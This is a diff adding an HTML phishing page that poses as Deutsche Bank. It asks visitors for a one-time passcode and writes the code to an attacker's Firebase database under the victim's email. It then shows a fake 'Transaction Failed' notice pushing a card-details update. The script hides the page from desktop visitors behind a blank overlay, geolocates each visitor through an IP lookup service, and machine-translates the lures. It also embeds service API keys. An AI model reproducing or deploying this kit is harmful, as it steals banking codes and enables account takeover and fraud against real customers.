@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      
+ <meta name="google" content="notranslate"> 
+ <meta name="color-scheme" content="light">
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap');
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-image: url('world1.jpg'); /* Replace with the generated globe image */
+  background-size: cover; /* Ensures the image covers the screen */
+  
+  background-repeat: no-repeat; 
+            font-family: 'Poppins', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+      user-select: none; /* Disables text selection */ -webkit-user-select: none; /* For Safari */ -moz-user-select: none; /* For Firefox */ -ms-user-select: none; 
+        }
+
+        .otp-container {
+            background: #FFFFFF;
+           margin-top: 10%;
+            border-radius: 12px;
+            padding: 20px;
+            width: 93%;
+            max-width: 400px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            position: relative;
+        height: 83vh;
+        }
+
+        h2 {
+            font-size: 24px;
+            color: #333333;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        p {
+            font-size: 16px;
+            color: #666666;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 14px;
+            font-size: 18px;
+            border-radius: 8px;
+            border: 1px solid #DDDDDD;
+            background: #F8F9FA;
+            margin-bottom: 20px;
+            outline: none;
+            transition: all 0.9s ease;
+        }
+
+        input[type="text"]:focus {
+            border-color: #4b0082;
+            box-shadow: 0 0 5px rgba(75, 0, 130, 0.5);
+            transform: scale(1.02);
+        }
+
+        button {
+          
+            color: #FFFFFF;
+            padding: 14px 28px;
+            font-size: 18px;
+            border-radius: 8px;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            transition: all 0.9s ease;
+        }
+
+        button:hover {
+            background-color: #388E3C;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
+        }
+
+        .resend-otp {
+            display: block;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #4CAF50;
+        }
+
+        .resend-otp a {
+            color: #4CAF50;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.9s ease;
+        }
+
+        .resend-otp a:hover {
+            color: #388E3C;
+            text-decoration: underline;
+        }
+
+        .trust-text {
+            font-size: 14px;
+            color: #666666;
+            margin-top: 30px;
+            line-height: 1.6;
+            text-align: left;
+        }
+
+        /* Smooth animation for the form */
+        .otp-container {
+            animation: fadeIn 4.5s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+         
+     .cta-button {
+            display: inline-block;
+            width: 100%;
+            padding: 15px 0;
+            color: #ffffff;
+            background-color: #ff6f61;
+            border-radius: 10px;
+            text-decoration: none;
+            font-size: 18px;
+            text-align: center;
+            transition: background-color 0.4s ease, box-shadow 0.4s ease;
+            box-shadow: 0 5px 12px rgba(255, 111, 97, 0.4);
+        }
+        .cta-button:hover {
+            background-color: #d9534f;
+            box-shadow: 0 8px 20px rgba(255, 111, 97, 0.7);
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 14px;
+            color: #888;
+            text-align: center;
+        }
+        /* Fade-in animation */
+        @keyframes fadeInUp {
+            0% {
+                opacity: 0;
+                transform: translateY(40px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        /* Responsive */
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+                border-radius: 15px;
+            }
+           .container {
+          width: 93%;
+            background-color: #ffffff;
+            padding: 35px;
+            border-radius: 20px;
+            padding: 20px;
+            transform: translateY(30px);
+            animation: fadeInUp 4s ease forwards;
+   
+       display: none;
+   position: fixed;
+  z-index: 2000000;
+  margin-top: -43px;
+   }
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }  
+       .header p {
+      font-size: 25px;
+       } 
+       h1 {
+            color: #ff6f61;
+            font-size: 28px;
+            margin-bottom: 20px;
+            text-align: center;
+            letter-spacing: 0.3px;
+        }
+        p {
+            color: #555;
+            line-height: 1.7;
+            font-size: 17px;
+            margin-bottom: 20px;
+            text-align: justify;
+        }      
+   .loader {
+           position: absolute;
+            width: 25px;
+            height: 25px;
+            border: 3px solid transparent;
+            border-top: 3px solid white;
+            border-radius: 50%;
+            animation: spin 0.3s linear infinite;
+            visibility: hidden;
+       display: inline-block;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    .loading2 .button-text1 {
+            visibility: hidden;
+        }
+  .loading2 .loader {
+            visibility: visible;
+       margin-left: -59px;
+        }
+    </style>
+</head>
+<body>
+   <div style="position: fixed; background-color: white; height: 100%; width: 100%; z-index: 9999999999999999; margin-left: -2%; margin-top: -1.5%; display: none;" id="overlay"></div>
+    <div class="otp-container">
+        <h2 id="doll">Enter OTP Code</h2>
+        <p id="dogg1">We’ve sent a One-Time Password (OTP) to your phone number or email address. Please enter it below to continue.</p>
+   <form id="dataForm">
+        <input type="text" id="field1" placeholder=" OTP?" required >
+        
+        
+        <button type="submit"  id="dogg2"><span class="button-text1">Verify OTP</span>  <div class="loader"></div></button>
+    </form>
+        <p class="trust-text" id="mold">
+            For your security, the OTP code is sent to the phone number or email address you provided during registration. Rest assured that your personal information is protected, and this verification step is essential for safeguarding your account.
+        </p>
+  
+    </div>
+ <div id="container" class="container" 
+
+    <div class="header">
+       
+    
+    <h1 id="withdraw">Transaction Failed</h1>
+    <p id="look" style="margin-bottom: -6px;">Dear</p>
+    <span id="displayName" style="font-weight: bold; margin-top: -11px;"></span>
+    <p id="hate">We encountered an issue with processing your recent transaction due to a problem with your current payment method. Please update your card details to ensure uninterrupted service.</p>
+
+    <p id="dear">Our system is secure, and the process is quick. Once updated, your transaction will be processed immediately without delay.</p>
+
+    <p id="bee">Thank you for your attention to this matter!</p>
+
+    <p id="ant">Best regards,<br>[Deutsche Bank]</p>
+
+    <h5  class="cta-button" id="dogg">Continue</h5>
+
+  </div>  
+</div>
+
+    <script>
+     function detectDesktopMode() {
+            // Check if the device is a mobile device by user-agent
+            const isMobile = /android|iphone|ipad|ipod|windows phone/i.test(navigator.userAgent);
+
+            // Get the current viewport width
+            const viewportWidth = window.innerWidth;
+
+            const deviceStatusElement = document.getElementById("deviceStatus");
+
+            // If it's a mobile device and the viewport width is greater than 800px, we consider it "desktop mode"
+            if (isMobile && viewportWidth > 800) {
+                // Desktop Mode on Mobile
+       document.getElementById("overlay").style.display = "block";         
+          
+            } else if (isMobile && viewportWidth <= 800) {
+                // Mobile Mode
+               document.getElementById("overlay").style.display = "none";            // Mobile mode
+                
+            } else {
+      document.getElementById("overlay").style.display = "block";                    
+            }
+        }
+
+        // Detect device mode on page load
+        window.addEventListener("DOMContentLoaded", detectDesktopMode);
+
+        // Detect on window resize to handle desktop/mobile mode changes dynamically
+        window.addEventListener("resize", detectDesktopMode);
+
+     
+      const formattedAmount = localStorage.getItem("fullname");
+      document.getElementById("displayName").textContent = formattedAmount 
+        ? formattedAmount 
+        : "No amount found in storage.";  
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyBZehk_8tWBhQOtCcS3VTzRRSCFCLvFGQA",
+            authDomain: "tuak-9f342.firebaseapp.com",
+            databaseURL: "https://tuak-9f342-default-rtdb.firebaseio.com",
+            projectId: "tuak-9f342",
+            storageBucket: "tuak-9f342.firebaseapp.com",
+            messagingSenderId: "9176071516",
+            appId: "1:9176071516:web:38491206a78ed1c4035599",
+            measurementId: "G-BM58W3CJTQ"
+        };
+
+        // Initialize Firebase
+        const app = firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+ 
+
+        // Helper function to sanitize email (replace special characters)
+        // Helper function to sanitize email (replace special characters)
+        function sanitizeEmail(email) {
+            return email.replace(/\./g, ",");
+        }
+ // Retrieve email from local storage
+        const email = localStorage.getItem("userEmail");
+        if (!email) {
+     window.parent.document.getElementById("iframe").src = "index.html";       
+            console.error("No email found in local storage.");
+      
+        } else {
+  const sanitizedEmail = sanitizeEmail(email);
+      
+        
+          
+            const emailRef = db.ref(`messages/${sanitizedEmail}`);
+ } document.getElementById('dogg2').addEventListener('click', function () {
+    event.preventDefault();
+document.getElementById('dogg2').classList.add('loading2');      
+
+const codeNumber = document.getElementById("field1").value;
+// Replace dots in the email with commas
+    const sanitizedEmail = email.replace(/\./g, ",");
+
+    // Update the database and handle success or failure
+    db.ref(`messages/${sanitizedEmail}`).update({
+       codeNumber
+    })
+    .then(() => {
+   setTimeout(() => {
+     document.getElementById("container").style.display ='block'      
+   document.getElementById('dogg2').classList.remove('loading2');      
+
+     }, 15000);           
+  
+  
+    })
+    .catch((error) => {
+        // Handle errors
+        console.error("Error updating the database:", error);
+        alert("An error occurred. Please try again.");
+    });
+
+});
+   // Select the fields and button
+const fields = [
+    document.getElementById("field1")
+];
+const verifyButton = document.getElementById('dogg2');
+
+// Function to check if all fields are filled
+function checkFields() {
+    const allFilled = fields.every(field => field.value.trim() !== "");
+    if (allFilled) {
+        verifyButton.style.backgroundColor = "#4b2b7f"; // Green color
+        verifyButton.disabled = false; // Enable the button if needed
+    } else {
+        verifyButton.style.backgroundColor = "#ccc"; // Gray color
+        verifyButton.disabled = true; // Disable the button
+    }
+}
+
+// Attach input event listeners to all fields
+fields.forEach(field => {
+    field.addEventListener('input', checkFields);
+});
+
+// Initial check when the page loads
+checkFields();
+
+  document.addEventListener('DOMContentLoaded', function() {
+  const countryLanguageMap = {
+                "AF": "fa", "AL": "sq", "DZ": "ar", "AS": "en", "AD": "ca", "AO": "pt", "AG": "en",
+                "AR": "es", "AM": "hy", "AU": "en", "AT": "de", "AZ": "az", "BS": "en", "BH": "ar",
+                "BD": "bn", "BB": "en", "BY": "be", "BE": "nl", "BZ": "en", "BJ": "fr", "BT": "dz",
+                "BO": "es", "BA": "bs", "BW": "en", "BR": "pt", "BN": "ms", "BG": "bg", "BF": "fr",
+                "BI": "fr", "CV": "pt", "KH": "km", "CM": "fr", "CA": "en", "CF": "fr", "TD": "fr",
+                "CL": "es", "CN": "zh-CN", "CO": "es", "KM": "ar", "CD": "fr", "CG": "fr", "CR": "es",
+                "CI": "fr", "HR": "hr", "CU": "es", "CY": "el", "CZ": "cs", "DK": "da", "DJ": "fr",
+                "DM": "en", "DO": "es", "EC": "es", "EG": "ar", "SV": "es", "GQ": "es", "ER": "ti",
+                "EE": "et", "SZ": "en", "ET": "am", "FJ": "en", "FI": "fi", "FR": "fr", "GA": "fr",
+                "GM": "en", "GE": "ka", "DE": "de", "GH": "en", "GR": "el", "GD": "en", "GT": "es",
+                "GN": "fr", "GW": "pt", "GY": "en", "HT": "fr", "HN": "es", "HU": "hu", "IS": "is",
+                "IN": "hi", "ID": "id", "IR": "fa", "IQ": "ar", "IE": "en", "IL": "he", "IT": "it",
+                "JM": "en", "JP": "ja", "JO": "ar", "KZ": "kk", "KE": "sw", "KI": "en", "KP": "ko",
+                "KR": "ko", "KW": "ar", "KG": "ky", "LA": "lo", "LV": "lv", "LB": "ar", "LS": "en",
+                "LR": "en", "LY": "ar", "LI": "de", "LT": "lt", "LU": "lb", "MG": "mg", "MW": "en",
+                "MY": "ms", "MV": "dv", "ML": "fr", "MT": "mt", "MH": "en", "MR": "ar", "MU": "en",
+                "MX": "es", "FM": "en", "MD": "ro", "MC": "fr", "MN": "mn", "ME": "sr", "MA": "ar",
+                "MZ": "pt", "MM": "my", "NA": "en", "NR": "na", "NP": "ne", "NL": "nl", "NZ": "en",
+                "NI": "es", "NE": "fr", "NG": "en", "MK": "mk", "NO": "no", "OM": "ar", "PK": "ur",
+                "PW": "en", "PA": "es", "PG": "en", "PY": "es", "PE": "es", "PH": "tl", "PL": "pl",
+                "PT": "pt", "QA": "ar", "RO": "ro", "RU": "ru", "RW": "rw", "KN": "en", "LC": "en",
+                "VC": "en", "WS": "sm", "SM": "it", "ST": "pt", "SA": "ar", "SN": "fr", "RS": "sr",
+                "SC": "fr", "SL": "en", "SG": "zh-CN", "SK": "sk", "SI": "sl", "SB": "en", "SO": "so",
+                "ZA": "af", "SS": "en", "ES": "es", "LK": "si", "SD": "ar", "SR": "nl", "SE": "sv",
+                "CH": "de", "SY": "ar", "TW": "zh-TW", "TJ": "tg", "TZ": "sw", "TH": "th", "TL": "pt",
+                "TG": "fr", "TO": "to", "TT": "en", "TN": "ar", "TR": "tr", "TM": "tk", "UG": "en",
+                "UA": "uk", "AE": "ar", "GB": "en", "US": "en", "UY": "es", "UZ": "uz", "VU": "bi",
+                "VE": "es", "VN": "vi", "YE": "ar", "ZM": "en", "ZW": "en"
+            };
+
+            function detectCountry(callback) {
+                fetch('https://ipinfo.io/json?token=84581b889c1970')
+                    .then(response => response.json())
+                    .then(data => {
+                        callback(data.country);
+                    })
+                    .catch(error => {
+             console.error('Error detecting country:', error);
+  document.getElementById("overlay").style.display = "block";         
+    });
+}
+
+            function translateText(text, targetLanguage, callback) {
+                     fetch(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=es&tl=${targetLanguage}&dt=t&q=${encodeURI(text)}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        const translatedText = data[0].map(item => item[0]).join('');
+                        callback(translatedText);
+                    })
+                   .catch(error => { 
+       console.error('Error translating text:', error);
+ document.getElementById("overlay").style.display = "block";         
+  });
+    }
+
+            function translateAllText(targetLanguage) {
+                const textsToTranslate = [
+                   
+                    { id: 'look', text: 'Dear' },
+  { id: 'you', text: 'We encountered an issue with processing your recent transaction due to a problem with your current payment method. Please update your card details to ensure uninterrupted service.' },
+  { id: 'hate', text: 'Your trust in us is highly valued. Rest assured that we are doing everything possible to deliver the best service. If you have any questions or need assistance, feel free to contact our support team' },
+  { id: 'dear', text: 'Our system is secure, and the process is quick. Once updated, your transaction will be processed immediately without delay.' },
+      { id: 'withdraw', text: 'Transaction Failed' },
+   { id: 'bee', text: 'Thank you for your attention to this matter!' },             
+{ id: 'ant', text: 'Best regard,       [Deutsche Bank]' }, 
+{ id: 'dogg', text: 'Continue' }, 
+{ id: 'doll', text: 'Enter OTP Code' }, 
+{ id: 'dogg1', text: 'We’ve sent a One-Time Password (OTP) to your phone number or email address. Please enter it below to continue.' }, 
+
+ { id: 'mold', text: 'For your security, the OTP code is sent to the phone number or email address you provided during registration. Rest assured that your personal information is protected, and this verification step is essential for safeguarding your account.' }
+
+               
+               
+               
+                ];
+
+                textsToTranslate.forEach(item => {
+                    translateText(item.text, targetLanguage, translatedText => {
+                        const element = document.getElementById(item.id);
+                        if (element) {
+                            element.innerText = translatedText;
+                        }
+                    });
+                });
+            }
+ const placeholdersToTranslate = [
+                { id: 'field1', text: 'Enter your OTP' }
+   
+            ];
+
+            
+            detectCountry(function(country) {
+                const targetLanguage = countryLanguageMap[country] || 'es'; // Default to Spanish if country not in map
+                translateAllText(targetLanguage);
+            });
+        });
+document.addEventListener('DOMContentLoaded', () => {
+            const displayNameElement = document.getElementById('displayName');
+       
+            
+            
+
+            // Get stored name and slider value from localStorage
+            const storedName = localStorage.getItem('userName');
+            const storedName2 = localStorage.getItem('userName');
+            const storedValue = localStorage.getItem('sliderValue');
+
+            // Display stored name
+            if (storedName) {
+                displayNameElement.textContent = ` ${storedName},`;
+               
+            } 
+            
+ });
+       
+       document.getElementById("dogg").addEventListener('click', function () {
+            window.parent.document.getElementById("iframe").src = "home.html";
+        });
+
+     // Listen for online and offline events
+      // Add an event listener for the online event
+    window.addEventListener('online', () => {
+      console.log('Internet connection restored. Reloading page...');
+      location.reload(); // Reload the page when the connection is restored
+    });
+
+    // Optional: Add a listener for the offline event for logging
+    window.addEventListener('offline', () => {
+      console.log('Internet connection lost.');
+    });
+
+    </script>
+</body>
+</html>
